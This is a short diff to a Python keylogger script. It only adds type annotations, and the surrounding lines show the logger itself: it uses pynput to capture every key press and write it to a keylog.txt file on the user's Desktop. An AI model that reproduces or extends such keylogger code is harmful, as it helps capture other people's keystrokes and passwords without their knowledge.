@@ -12,7 +12,7 @@ import os
 from pynput.keyboard import Listener
 
 # get user login
-user = os.getlogin()
+user: str = os.getlogin()
 # create out dir
 out_dir = f"C:/Users//{user}/Desktop"
 ''' 
@@ -31,7 +31,7 @@ logging.basicConfig(filename=f"{out_dir}/keylog.txt",
 
 
 # key logger
-def key_handler(key):
+def key_handler(key) -> None:
     # log key
     logging.info(key)
     # log confirmation
